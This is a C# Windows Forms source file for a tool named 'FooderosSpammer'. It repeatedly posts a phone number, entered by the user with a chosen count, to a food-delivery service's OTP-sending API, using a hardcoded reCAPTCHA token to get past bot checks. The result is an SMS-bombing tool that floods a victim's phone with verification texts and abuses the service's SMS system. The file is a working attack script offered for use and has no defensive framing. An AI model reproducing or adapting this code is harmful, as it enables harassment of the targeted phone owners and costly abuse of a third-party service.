using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FooderosSpammer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private static readonly HttpClient client = new HttpClient();

        private async Task startAsync(string number, int count)
        {

            var values = new Dictionary<string, string>
            {
                {"phone", number},
                {"country_id", "1"},
                {"recaptcha", "03AGdBq26YUdKW_pEr7m2Q90Jzy7FlFRj98xkTuZKpLf2e7xyLQeLI5eDwv8rlML-2Xee7Qq-zND6uuXWLQQbiJGYq7hI52TV1_OQjIl08zyk2pNSHLSErVnpbYV5Qc_C0V2Shp0eIG2XrovTG3IqNoOVxbi0zoR9mvCP82xlSjif1K0ZRJohQ4fWiqEV-hvi-s87IQB4PCAiQKQC9V4ZpF5TvObToHNg51mzgr6dcbzh_zod3dSo3UUWFLgiE1elQdL-ud6706Htv4TUNwAdSCaPcpxUmqFnCh8CfxM2T5Rj7JscdX2w5qkTIlMzMga0Fzd_3ZVta9IB0t9XL2bbCRAbQygiMI6eSsXQ8OlnGCxRXSVIThKV3UINEJHSxw2wRcAwYlIj2ATLrtLyrgBxsOywXdOf7qQXySSCrzYIQhwTTfHzHrG8bjg-XgwTyaWkypbH-wBYE28b8hU317CwMWJu9b58i0Tx45Q"}
            };
            var content = new FormUrlEncodedContent(values);

            int sent = 0;

            for (int i = 0; i < count; i++)
            {
                var response = await client.PostAsync("https://api.fooderos.com/api/v1/send/otp", content);
                textBox3.Text += (i + 1) + ". " + number + " sent";
                label5.Text = "" + ++sent;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string number = textBox1.Text;
            int count = int.Parse(textBox2.Text);
            label4.Text = "" + count;
            Thread thread = new Thread(start: () => startAsync(number, count));
            thread.Start();
        }
    }
}
